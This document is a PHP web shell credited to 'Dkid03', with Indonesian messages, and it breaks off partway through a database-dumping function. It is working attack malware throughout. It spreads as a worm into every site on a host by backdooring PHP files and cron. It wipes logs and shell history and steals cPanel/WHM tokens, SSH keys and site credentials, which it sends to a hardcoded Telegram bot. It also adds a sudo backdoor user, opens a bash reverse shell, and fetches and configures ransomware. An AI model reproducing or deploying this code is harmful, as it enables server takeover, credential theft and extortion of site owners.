<?php
//Writer: Dkid03
//please don't change the creator name 
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

if (!function_exists('shell_exec')) {
    function shell_exec($cmd) {
        return 'shell_exec tidak tersedia di server ini.';
    }
}

$rootPath = realpath(__DIR__);
$animeImageUrl = 'https://e.top4top.io/p_3838xi4x00.jpg';

$botToken = '8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4';
$telegramUserId = '7547598395';

define('EMERGENCY_PASSWORD', 'Dkid@#$123');
define('ALLOWED_IP', '');

$editableExtensions = ['txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'md', 'ini', 'log', 'htaccess'];

$specialDirectories = [
    'public_html' => realpath($_SERVER['DOCUMENT_ROOT']),
    'user' => realpath('/home'),
    'etc' => realpath('/etc'),
    'log' => realpath('/var/log'),
    'homeshell' => $rootPath
];

// ==================== FUNGSI UTILITY ====================
function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

function deleteDirectory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        is_dir($path) ? deleteDirectory($path) : unlink($path);
    }
    return rmdir($dir);
}

function breadcrumb($path, $rootPath, $specialDirs) {
    $breadcrumb = '<a href="?path=">HomeShell</a> | ';
    foreach ($specialDirs as $name => $dirPath) {
        if ($dirPath && is_dir($dirPath)) {
            $breadcrumb .= '<a href="?path=' . urlencode($dirPath) . '">' . htmlspecialchars($name) . '</a> | ';
        }
    }
    $relative = str_replace($rootPath, '', $path);
    $parts = array_filter(explode('/', $relative));
    $current = '';
    foreach ($parts as $part) {
        $current .= '/' . $part;
        $breadcrumb .= ' / <a href="?path=' . urlencode($current) . '">' . htmlspecialchars($part) . '</a>';
    }
    return $breadcrumb;
}

function isSafePath($path, $rootPath, $specialDirs) {
    if (strpos($path, $rootPath) === 0) return true;
    foreach ($specialDirs as $dirPath) {
        if ($dirPath && strpos($path, $dirPath) === 0) return true;
    }
    return false;
}

function sendTelegramMessage($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    $postData = http_build_query($data);

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($result !== false && $httpCode == 200) {
            $response = json_decode($result, true);
            if (isset($response['ok']) && $response['ok'] === true) {
                return true;
            }
        }
    }

    if (ini_get('allow_url_fopen')) {
        $options = [
            'http' => [
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => $postData,
                'timeout' => 10
            ],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
        ];
        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        if ($result !== false) {
            $response = json_decode($result, true);
            if (isset($response['ok']) && $response['ok'] === true) {
                return true;
            }
        }
    }

    if (function_exists('fsockopen')) {
        $host = 'api.telegram.org';
        $port = 443;
        $errno = 0;
        $errstr = '';
        $fp = @fsockopen('ssl://' . $host, $port, $errno, $errstr, 10);
        if ($fp) {
            $request = "POST /bot{$botToken}/sendMessage HTTP/1.1\r\n"
                     . "Host: api.telegram.org\r\n"
                     . "Content-Type: application/x-www-form-urlencoded\r\n"
                     . "Content-Length: " . strlen($postData) . "\r\n"
                     . "Connection: close\r\n\r\n"
                     . $postData;
            fwrite($fp, $request);
            $response = '';
            while (!feof($fp)) {
                $response .= fgets($fp, 128);
            }
            fclose($fp);
            if (strpos($response, '200 OK') !== false) {
                return true;
            }
        }
    }
    return false;
}

function getAllSubDirectories($dir) {
    $subDirs = [];
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path) && !is_link($path)) {
            $subDirs[] = $path;
            $subDirs = array_merge($subDirs, getAllSubDirectories($path));
        }
    }
    return $subDirs;
}

function getImmediateSubDirectories($dir) {
    $subDirs = [];
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path) && !is_link($path)) $subDirs[] = $path;
    }
    return $subDirs;
}

function bulkDeleteFiles($baseDir, $fileList, $mode) {
    $targetDirs = [$baseDir];
    if ($mode === 'shallow') {
        $targetDirs = array_merge($targetDirs, getImmediateSubDirectories($baseDir));
    } elseif ($mode === 'deep') {
        $targetDirs = array_merge($targetDirs, getAllSubDirectories($baseDir));
    }
    $results = ['deleted' => [], 'not_found' => [], 'errors' => []];
    $files = array_filter(array_map('trim', explode("\n", $fileList)));
    foreach ($targetDirs as $dir) {
        foreach ($files as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . basename($file);
            if (is_file($path)) {
                unlink($path) ? $results['deleted'][] = $path : $results['errors'][] = $path;
            } elseif (!in_array($file, $results['not_found'])) {
                $results['not_found'][] = $file;
            }
        }
    }
    return $results;
}

function getSystemInfo() {
    return [
        'PHP Version' => phpversion(),
        'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'Server API' => php_sapi_name(),
        'max_execution_time' => ini_get('max_execution_time') . ' seconds',
        'memory_limit' => ini_get('memory_limit'),
        'upload_max_filesize' => ini_get('upload_max_filesize'),
        'post_max_size' => ini_get('post_max_size'),
        'Disabled Functions' => ini_get('disable_functions') ?: 'none',
        'Safe Mode' => ini_get('safe_mode') ? 'On' : 'Off',
        'Operating System' => php_uname('s') . ' ' . php_uname('r'),
        'Current User' => get_current_user(),
        'Document Root' => $_SERVER['DOCUMENT_ROOT'],
        'Script Path' => __FILE__
    ];
}

function isTerminalActive() {
    if (!function_exists('shell_exec')) return false;
    if (ini_get('safe_mode')) return false;
    $disabled = explode(',', ini_get('disable_functions'));
    if (in_array('shell_exec', array_map('trim', $disabled))) return false;
    return @shell_exec('echo 1') !== null;
}

// ==================== GET ALL DOCUMENT ROOTS (SAME IP) ====================
function get_all_document_roots() {
    $roots = [];
    $processed = [];

    if (file_exists('/etc/userdomains')) {
        $lines = file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($lines as $line) {
            if (strpos($line, ':') === false) continue;
            list($domain, $user) = explode(':', $line);
            $user = trim($user);
            if (!empty($user) && !in_array($user, $processed)) {
                $docRoot = "/home/{$user}/public_html";
                if (is_dir($docRoot)) {
                    $roots[] = $docRoot;
                    $processed[] = $user;
                }
                $docRoot = "/home/{$user}/www";
                if (is_dir($docRoot)) {
                    $roots[] = $docRoot;
                    $processed[] = $user . '_www';
                }
            }
        }
    }

    $homeDirs = glob('/home/*', GLOB_ONLYDIR);
    foreach ($homeDirs as $home) {
        $user = basename($home);
        if (in_array($user, $processed)) continue;
        $docRoot = $home . '/public_html';
        if (is_dir($docRoot)) {
            $roots[] = $docRoot;
            $processed[] = $user;
        }
        $docRoot = $home . '/www';
        if (is_dir($docRoot)) {
            $roots[] = $docRoot;
            $processed[] = $user . '_www';
        }
    }

    $varDirs = ['/var/www', '/var/www/html', '/var/www/public_html'];
    foreach ($varDirs as $dir) {
        if (is_dir($dir) && !in_array($dir, $roots)) {
            $roots[] = $dir;
        }
        $subs = glob($dir . '/*', GLOB_ONLYDIR);
        foreach ($subs as $sub) {
            if (is_dir($sub . '/public_html')) {
                $roots[] = $sub . '/public_html';
            } elseif (is_dir($sub . '/www')) {
                $roots[] = $sub . '/www';
            } elseif (is_dir($sub) && !in_array($sub, $roots)) {
                $roots[] = $sub;
            }
        }
    }

    $apacheConfigs = [
        '/etc/apache2/sites-enabled/*.conf',
        '/etc/httpd/conf.d/*.conf',
        '/etc/apache2/apache2.conf',
        '/etc/httpd/conf/httpd.conf'
    ];
    foreach ($apacheConfigs as $pattern) {
        $files = glob($pattern);
        foreach ($files as $conf) {
            if (!is_file($conf) || !is_readable($conf)) continue;
            $content = file_get_contents($conf);
            if (preg_match_all('/DocumentRoot\s+"([^"]+)"/i', $content, $matches)) {
                foreach ($matches[1] as $doc) {
                    $doc = realpath($doc);
                    if ($doc && is_dir($doc) && !in_array($doc, $roots)) {
                        $roots[] = $doc;
                    }
                }
            }
            if (preg_match_all('/<VirtualHost[^>]*>\s*DocumentRoot\s+"([^"]+)"/i', $content, $matches2)) {
                foreach ($matches2[1] as $doc) {
                    $doc = realpath($doc);
                    if ($doc && is_dir($doc) && !in_array($doc, $roots)) {
                        $roots[] = $doc;
                    }
                }
            }
        }
    }

    $nginxConfigs = [
        '/etc/nginx/sites-enabled/*.conf',
        '/etc/nginx/conf.d/*.conf',
        '/etc/nginx/nginx.conf'
    ];
    foreach ($nginxConfigs as $pattern) {
        $files = glob($pattern);
        foreach ($files as $conf) {
            if (!is_file($conf) || !is_readable($conf)) continue;
            $content = file_get_contents($conf);
            if (preg_match_all('/root\s+([^;]+)/i', $content, $matches)) {
                foreach ($matches[1] as $doc) {
                    $doc = trim($doc, ' ;');
                    $doc = realpath($doc);
                    if ($doc && is_dir($doc) && !in_array($doc, $roots)) {
                        $roots[] = $doc;
                    }
                }
            }
            if (preg_match_all('/server\s*{[^}]*root\s+([^;]+)/i', $content, $matches2)) {
                foreach ($matches2[1] as $doc) {
                    $doc = trim($doc, ' ;');
                    $doc = realpath($doc);
                    if ($doc && is_dir($doc) && !in_array($doc, $roots)) {
                        $roots[] = $doc;
                    }
                }
            }
        }
    }

    if (isset($_SERVER['DOCUMENT_ROOT']) && is_dir($_SERVER['DOCUMENT_ROOT']) && !in_array($_SERVER['DOCUMENT_ROOT'], $roots)) {
        $roots[] = $_SERVER['DOCUMENT_ROOT'];
    }

    $extraDirs = ['/tmp', '/var/tmp', '/home', '/var/log', '/etc', '/usr/local', '/opt', '/srv'];
    foreach ($extraDirs as $dir) {
        if (is_dir($dir) && is_writable($dir) && !in_array($dir, $roots)) {
            $roots[] = $dir;
        }
        $subs = glob($dir . '/*', GLOB_ONLYDIR);
        foreach ($subs as $sub) {
            if (is_writable($sub) && !in_array($sub, $roots)) {
                $roots[] = $sub;
            }
        }
    }

    if (is_writable('/') && !in_array('/', $roots)) {
        $roots[] = '/';
    }

    $roots = array_unique($roots);
    $roots = array_filter($roots, 'is_dir');
    return $roots;
}

// ==================== WORM (MANUAL) ====================
function worm_propagate_domain($currentFile) {
    global $botToken, $telegramUserId;
    $infectedDirs = [];
    $targetDirs = get_all_document_roots();

    foreach ($targetDirs as $dir) {
        if (!is_writable($dir)) continue;
        $targetFile = $dir . '/' . basename($currentFile);
        if (!file_exists($targetFile)) {
            @copy($currentFile, $targetFile);
            @chmod($targetFile, 0644);
            $infectedDirs[] = $dir;
        }
        $phpFiles = glob($dir . '/*.php');
        foreach ($phpFiles as $phpFile) {
            if (basename($phpFile) == basename($currentFile)) continue;
            if (!is_writable($phpFile)) continue;
            $content = file_get_contents($phpFile);
            if (strpos($content, 'worm_propagate_domain') !== false) continue;
            $backdoor = "<?php if (file_exists('" . basename($currentFile) . "')) { include '" . basename($currentFile) . "'; worm_propagate_domain('" . addslashes($currentFile) . "'); } ?>\n";
            file_put_contents($phpFile, $backdoor . $content);
        }
        if (function_exists('shell_exec')) {
            $cronCmd = "php " . escapeshellarg($targetFile) . " > /dev/null 2>&1";
            $crontab = shell_exec('crontab -l 2>/dev/null');
            if ($crontab === null || strpos($crontab, basename($currentFile)) === false) {
                $newCron = ($crontab ? $crontab : '') . "\n*/5 * * * * " . $cronCmd . "\n";
                file_put_contents('/tmp/crontab.tmp', $newCron);
                shell_exec('crontab /tmp/crontab.tmp 2>/dev/null');
                unlink('/tmp/crontab.tmp');
            }
        }
    }

    if (!empty($infectedDirs)) {
        $message = "🐛 *Worm Multi-Domain*\n\nBerhasil menginfeksi " . count($infectedDirs) . " direktori:\n";
        foreach ($infectedDirs as $d) {
            $message .= "- " . htmlspecialchars($d) . "\n";
        }
        sendTelegramMessage($botToken, $telegramUserId, $message);
    }
    return $infectedDirs;
}

// ==================== ANTI-FORENSIC ====================
function clean_traces() {
    $logFiles = ['/var/log/apache2/access.log', '/var/log/nginx/access.log', '/var/log/httpd/access_log'];
    foreach ($logFiles as $log) {
        if (file_exists($log) && is_writable($log)) {
            file_put_contents($log, '');
        }
    }
    $home = getenv('HOME') ?: '/root';
    $history = $home . '/.bash_history';
    if (file_exists($history) && is_writable($history)) {
        file_put_contents($history, '');
    }
    if (file_exists(__FILE__)) {
        touch(__FILE__, strtotime('2023-01-01 00:00:00'));
    }
    foreach (glob('/tmp/crontab.tmp') as $f) { @unlink($f); }
    foreach (glob('/tmp/*.php') as $f) { @unlink($f); }
}

// ==================== CREDENTIAL HARVESTING ====================
function cpanel_harvest() {
    global $botToken, $telegramUserId;
    $found = [];
    $users = [];
    if (file_exists('/etc/userdomains')) {
        $lines = file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($lines as $line) {
            if (strpos($line, ':') === false) continue;
            list($domain, $user) = explode(':', $line);
            $user = trim($user);
            if (!empty($user)) $users[] = $user;
        }
    }
    if (empty($users) && function_exists('shell_exec')) {
        $homeUsers = shell_exec('ls /home 2>/dev/null');
        if ($homeUsers) {
            $users = array_filter(explode("\n", trim($homeUsers)));
        }
    }
    foreach ($users as $user) {
        $home = "/home/{$user}";
        $accesshash = $home . '/.accesshash';
        if (file_exists($accesshash) && is_readable($accesshash)) {
            $hash = file_get_contents($accesshash);
            $found[] = "User: $user - AccessHash: " . trim($hash);
        }
        $whm_token = $home . '/.cpanel/whm_token';
        if (file_exists($whm_token) && is_readable($whm_token)) {
            $token = file_get_contents($whm_token);
            $found[] = "User: $user - WHM Token: " . trim($token);
        }
        $public_html = $home . '/public_html';
        if (is_dir($public_html)) {
            $configFiles = ['.env', 'wp-config.php', 'config.php', 'db.php', 'database.php'];
            foreach ($configFiles as $cfg) {
                $path = $public_html . '/' . $cfg;
                if (file_exists($path) && is_readable($path)) {
                    $content = file_get_contents($path);
                    preg_match_all('/(DB_PASSWORD|DB_USER|DB_HOST|DB_NAME|PASSWORD|SECRET_KEY|API_KEY|AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY|DB_PASS)\s*=\s*[\'"]?([^\'"]+)[\'"]?/i', $content, $matches);
                    if (!empty($matches[2])) {
                        $found[] = "User: $user - File: $cfg - Creds: " . implode(', ', array_map(function($k, $v) { return "$k=$v"; }, $matches[1], $matches[2]));
                    }
                }
            }
        }
    }
    if (file_exists('/root/.accesshash')) {
        $hash = file_get_contents('/root/.accesshash');
        $found[] = "Root AccessHash: " . trim($hash);
    }
    if (file_exists('/etc/cpanel/whm_token')) {
        $token = file_get_contents('/etc/cpanel/whm_token');
        $found[] = "Global WHM Token: " . trim($token);
    }
    if (!empty($found)) {
        $message = "🔑 *Credential Harvesting Results*\n\n" . implode("\n", $found);
        sendTelegramMessage($botToken, $telegramUserId, $message);
    } else {
        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan kredensial.");
    }
    return $found;
}

// ==================== CONFIG & BACKUP FINDER ====================
function find_sensitive_files() {
    global $botToken, $telegramUserId;
    $found = [];
    $patterns = [
        '/.env', '/wp-config.php', '/config.php', '/database.php', '/db.php',
        '/*.sql', '/*.tar', '/*.gz', '/*.zip', '/*.bak', '/*.old',
        '/.htaccess', '/.htpasswd', '/web.config',
        '/settings.php', '/configuration.php', '/config.inc.php'
    ];
    $roots = get_all_document_roots();
    foreach ($roots as $root) {
        foreach ($patterns as $pattern) {
            $files = glob($root . $pattern);
            foreach ($files as $file) {
                if (is_file($file) && is_readable($file)) {
                    $size = filesize($file);
                    $found[] = "$file (" . formatSize($size) . ")";
                }
            }
            $subs = glob($root . '/*/' . ltrim($pattern, '/'));
            foreach ($subs as $file) {
                if (is_file($file) && is_readable($file)) {
                    $size = filesize($file);
                    $found[] = "$file (" . formatSize($size) . ")";
                }
            }
        }
    }
    if (!empty($found)) {
        $msg = "🔍 *Sensitive Files Found*\n\n" . implode("\n", $found);
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        return $found;
    } else {
        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan file sensitif.");
        return [];
    }
}

// ==================== BACKDOOR USER CREATOR ====================
function create_backdoor_user($username, $password) {
    if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia.";
    $output = shell_exec("useradd -m -s /bin/bash $username 2>&1");
    if (strpos($output, 'exists') !== false) {
        return "❌ User $username sudah ada.";
    }
    shell_exec("echo '$username:$password' | chpasswd 2>&1");
    shell_exec("usermod -aG sudo $username 2>&1");
    $uid = shell_exec("id -u $username 2>&1");
    return "✅ User $username berhasil dibuat (UID: $uid) dengan password: $password";
}

// ==================== REVERSE SHELL MANAGER ====================
function start_reverse_shell($ip, $port) {
    if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia.";
    $script = "/tmp/rshell_$port.sh";
    $content = "#!/bin/bash\nbash -i >& /dev/tcp/$ip/$port 0>&1\n";
    file_put_contents($script, $content);
    chmod($script, 0755);
    shell_exec("nohup $script > /dev/null 2>&1 &");
    global $botToken, $telegramUserId;
    sendTelegramMessage($botToken, $telegramUserId, "✅ Reverse shell ke $ip:$port telah dimulai.");
    return true;
}

function stop_reverse_shell($port) {
    if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia.";
    $result = shell_exec("pkill -f 'rshell_$port' 2>&1");
    return "✅ Reverse shell port $port dihentikan.";
}

function status_reverse_shell() {
    if (!function_exists('shell_exec')) return "❌ shell_exec tidak tersedia.";
    $output = shell_exec("ps aux | grep rshell_ | grep -v grep");
    if (empty($output)) {
        return "❌ Tidak ada reverse shell aktif.";
    }
    return "🔄 Reverse shell aktif:\n$output";
}

// ==================== ADVANCED LOG CLEANER ====================
function clean_logs_advanced() {
    $logDirs = [
        '/var/log/apache2', '/var/log/nginx', '/var/log/httpd',
        '/var/log', '/var/log/mysql', '/var/log/postgresql'
    ];
    $files = [];
    foreach ($logDirs as $dir) {
        if (is_dir($dir)) {
            $files = array_merge($files, glob("$dir/*.log"), glob("$dir/*.log.*"));
        }
    }
    $count = 0;
    foreach ($files as $file) {
        if (is_writable($file)) {
            file_put_contents($file, '');
            $count++;
        }
    }
    if (function_exists('shell_exec')) {
        $users = array_filter(explode("\n", shell_exec('ls /home')));
        foreach ($users as $user) {
            $hist = "/home/$user/.bash_history";
            if (file_exists($hist)) file_put_contents($hist, '');
            $hist = "/home/$user/.mysql_history";
            if (file_exists($hist)) file_put_contents($hist, '');
        }
        if (file_exists('/root/.bash_history')) file_put_contents('/root/.bash_history', '');
        if (file_exists('/root/.mysql_history')) file_put_contents('/root/.mysql_history', '');
        array_map('unlink', glob('/tmp/*.php'));
        array_map('unlink', glob('/var/tmp/*.php'));
    }
    return "🧹 Log dan history dibersihkan ($count file log dihapus).";
}

// ==================== SSH KEY GRABBER ====================
function grab_ssh_keys() {
    global $botToken, $telegramUserId;
    $keys = [];
    if (function_exists('shell_exec')) {
        $users = array_filter(explode("\n", shell_exec('ls /home')));
        $users[] = 'root';
        foreach ($users as $user) {
            $home = ($user == 'root') ? '/root' : "/home/$user";
            $sshDir = $home . '/.ssh';
            if (is_dir($sshDir)) {
                $privKeys = glob("$sshDir/id_*");
                foreach ($privKeys as $key) {
                    if (is_file($key) && is_readable($key)) {
                        $content = file_get_contents($key);
                        $keys[] = "User: $user - File: " . basename($key) . "\n" . $content;
                    }
                }
                $auth = $sshDir . '/authorized_keys';
                if (file_exists($auth)) {
                    $keys[] = "User: $user - authorized_keys:\n" . file_get_contents($auth);
                }
            }
        }
    }
    if (!empty($keys)) {
        $msg = "🔑 *SSH Keys Found*\n\n" . implode("\n\n", $keys);
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        return $keys;
    } else {
        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ada SSH keys ditemukan.");
        return [];
    }
}

// ==================== WORDPRESS & LARAVEL SCANNER ====================
function scan_wordpress_laravel() {
    global $botToken, $telegramUserId;
    $found = [];
    $roots = get_all_document_roots();
    foreach ($roots as $root) {
        if (file_exists($root . '/wp-config.php')) {
            $content = file_get_contents($root . '/wp-config.php');
            preg_match_all("/define\(\s*['\"](DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY)['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $matches);
            if (!empty($matches[2])) {
                $found[] = "📌 WordPress at $root\n" . implode("\n", array_map(function($k, $v) { return "$k: $v"; }, $matches[1], $matches[2]));
            }
        }
        if (file_exists($root . '/.env')) {
            $content = file_get_contents($root . '/.env');
            preg_match_all("/(DB_|APP_|REDIS_|MAIL_|PUSHER_)([A-Z_]+)\s*=\s*([^\s]+)/", $content, $matches);
            if (!empty($matches[3])) {
                $found[] = "📌 Laravel .env at $root\n" . implode("\n", array_map(function($k, $v) { return "$k: $v"; }, $matches[2], $matches[3]));
            }
        }
        $subs = glob($root . '/*', GLOB_ONLYDIR);
        foreach ($subs as $sub) {
            if (file_exists($sub . '/wp-config.php')) {
                $content = file_get_contents($sub . '/wp-config.php');
                preg_match_all("/define\(\s*['\"](DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY)['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $matches);
                if (!empty($matches[2])) {
                    $found[] = "📌 WordPress at $sub\n" . implode("\n", array_map(function($k, $v) { return "$k: $v"; }, $matches[1], $matches[2]));
                }
            }
            if (file_exists($sub . '/.env')) {
                $content = file_get_contents($sub . '/.env');
                preg_match_all("/(DB_|APP_)([A-Z_]+)\s*=\s*([^\s]+)/", $content, $matches);
                if (!empty($matches[3])) {
                    $found[] = "📌 Laravel .env at $sub\n" . implode("\n", array_map(function($k, $v) { return "$k: $v"; }, $matches[2], $matches[3]));
                }
            }
        }
    }
    if (!empty($found)) {
        $msg = "📝 *WordPress & Laravel Credentials*\n\n" . implode("\n\n", $found);
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        return $found;
    } else {
        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan kredensial WordPress/Laravel.");
        return [];
    }
}

// ==================== CREATE RANSOMWARE FROM REPO ====================
function create_ransomware() {
    global $botToken, $telegramUserId;
    
    $url = 'https://raw.githubusercontent.com/Iqyans/IqyanCodes/refs/heads/main/R.php';
    $targetFile = __DIR__ . '/R.php';
    
    $code = @file_get_contents($url);
    if ($code === false) {
        sendTelegramMessage($botToken, $telegramUserId, "❌ Gagal mengunduh kode ransomware dari GitHub.");
        return false;
    }
    
    // Ganti konfigurasi dengan milik sendiri
    $code = preg_replace('/\$bot_token\s*=\s*[\'"].*?[\'"]/', '$bot_token = \'' . $botToken . '\'', $code);
    $code = preg_replace('/\$my_chat_id\s*=\s*[\'"].*?[\'"]/', '$my_chat_id = \'' . $telegramUserId . '\'', $code);
    $code = preg_replace('/\$verif_code\s*=\s*[\'"].*?[\'"]/', '$verif_code = \'Dkid@123\'', $code);
    
    if (file_put_contents($targetFile, $code) === false) {
        sendTelegramMessage($botToken, $telegramUserId, "❌ Gagal menyimpan file R.php");
        return false;
    }
    
    chmod($targetFile, 0644);
    
    $message = "✅ *Ransomware berhasil dibuat!*\n"
             . "📁 Lokasi: " . $targetFile . "\n"
             . "🔑 Bot Token: " . $botToken . "\n"
             . "📱 Chat ID: " . $telegramUserId . "\n\n"
             . "⚠️ Jalankan dengan mengakses R.php di browser.";
    sendTelegramMessage($botToken, $telegramUserId, $message);
    
    return true;
}

// ==================== CPANEL MODULE ====================
function is_cpanel_installed() {
    if (file_exists('/usr/local/cpanel/version')) return true;
    if (file_exists('/usr/local/cpanel/cpanel')) return true;
    $sock = @fsockopen('127.0.0.1', 2083, $errno, $errstr, 2);
    if ($sock) { fclose($sock); return true; }
    $sock = @fsockopen('127.0.0.1', 2087, $errno, $errstr, 2);
    if ($sock) { fclose($sock); return true; }
    return false;
}

function get_whm_token() {
    $tokenFiles = [
        '/root/.accesshash',
        '/home/*/.cpanel/whm_token',
        '/etc/cpanel/whm_token'
    ];
    foreach ($tokenFiles as $pattern) {
        foreach (glob($pattern) as $file) {
            $content = file_get_contents($file);
            if (preg_match('/[a-f0-9]{64}/i', $content, $match)) {
                return $match[0];
            }
        }
    }
    $envToken = getenv('WHM_TOKEN');
    if ($envToken) return $envToken;
    return false;
}

function cpanel_api_request($endpoint, $params = [], $method = 'GET') {
    $token = get_whm_token();
    if (!$token) return ['error' => 'WHM token tidak ditemukan.'];
    $url = "https://127.0.0.1:2087/json-api/" . $endpoint . "?" . http_build_query($params);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: whm ' . $token]);
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    }
    $response = curl_exec($ch);
    curl_close($ch);
    if ($response === false) return ['error' => 'Gagal terhubung ke WHM API.'];
    $data = json_decode($response, true);
    if (!isset($data['data'])) return ['error' => 'Respon tidak valid.'];
    return $data['data'];
}

function cpanel_list_accounts() {
    $data = cpanel_api_request('listaccts');
    if (isset($data['error'])) return "❌ " . $data['error'];
    if (!isset($data['acct'])) return "❌ Tidak ada akun ditemukan.";
    $accounts = [];
    foreach ($data['acct'] as $acct) {
        $accounts[] = "- " . $acct['user'] . " (domain: " . $acct['domain'] . ", plan: " . $acct['plan'] . ")";
    }
    return implode("\n", $accounts);
}

function cpanel_create_account($username, $domain, $password, $plan = 'default') {
    $params = [
        'username' => $username,
        'domain' => $domain,
        'password' => $password,
        'plan' => $plan,
        'contactemail' => $username . '@' . $domain
    ];
    $result = cpanel_api_request('createacct', $params, 'POST');
    if (isset($result['error'])) return "❌ " . $result['error'];
    return "✅ Akun berhasil dibuat: $username";
}

function cpanel_change_password($username, $newPassword) {
    $params = ['user' => $username, 'pass' => $newPassword];
    $result = cpanel_api_request('passwd', $params, 'POST');
    if (isset($result['error'])) return "❌ " . $result['error'];
    return "✅ Password berhasil diubah untuk $username";
}

function cpanel_backup_account($username) {
    $params = ['user' => $username];
    $result = cpanel_api_request('backup', $params, 'POST');
    if (isset($result['error'])) return "❌ " . $result['error'];
    return "✅ Backup akun $username sedang diproses.";
}

function cpanel_delete_account($username, $keepfiles = '0') {
    $params = ['user' => $username, 'keepfiles' => $keepfiles];
    $result = cpanel_api_request('removeacct', $params, 'POST');
    if (isset($result['error'])) return "❌ " . $result['error'];
    return "✅ Akun $username berhasil dihapus.";
}

function cpanel_handler($action, $username = '', $extra = '') {
    if (!is_cpanel_installed()) return "❌ cPanel/WHM tidak terdeteksi di server ini.";
    switch ($action) {
        case 'list':
            return cpanel_list_accounts();
        case 'create':
            if (empty($username) || empty($extra)) return "❌ Format: /cpanel create [username] [domain] [password] [plan]";
            $parts = explode(' ', $extra);
            $domain = $parts[0] ?? '';
            $password = $parts[1] ?? 'password123';
            $plan = $parts[2] ?? 'default';
            return cpanel_create_account($username, $domain, $password, $plan);
        case 'passwd':
            if (empty($username) || empty($extra)) return "❌ Format: /cpanel passwd [username] [passwordbaru]";
            return cpanel_change_password($username, $extra);
        case 'backup':
            if (empty($username)) return "❌ Format: /cpanel backup [username]";
            return cpanel_backup_account($username);
        case 'delete':
            if (empty($username)) return "❌ Format: /cpanel delete [username] [keepfiles?]";
            $keep = ($extra == 'keep') ? '1' : '0';
            return cpanel_delete_account($username, $keep);
        default:
            return "❌ Aksi tidak dikenali. Gunakan: list, create, passwd, backup, delete";
    }
}

// ==================== DATABASE DUMPING ====================
function dump_databases() {
    $dumps = [];
    $configFiles = ['config.php', '.env', 'wp-config.php', 'database.php', 'db.php'];
    $found = [];
    foreach ($configFiles as $cfg) {
        $path = __DIR__ . '/' . $cfg;
        if (file_exists($path)) {
            $found[] = $path;
        }
        foreach (glob(__DIR__ . '/*/' . $cfg) as $f) {
            $found[] = $f;
        }
    }
    foreach ($found as $file) {
        $content = file_get_contents($file);
        preg_match_all('/[\'"]?(DB_HOST|DB_NAME|DB_USER|DB_PASS|DB_PASSWORD)[\'"]?\s*=>?\s*[\'"]([^\'"]+)[\'"]/i', $content, $matches);
        if (!empty($matches[2])) {
            $dumps[] = "📄 " . basename($file) . ":\n" . implode("\n", array_map(function($k, $v) { return "$k: $v"; }, $matches[1], $matches[2]));
        }
    }
    if (function_exists('shell_exec')) {
        $output = shell_exec('mysql --version 2>&1');
        if (strpos($output, 'mysql') !== false) {
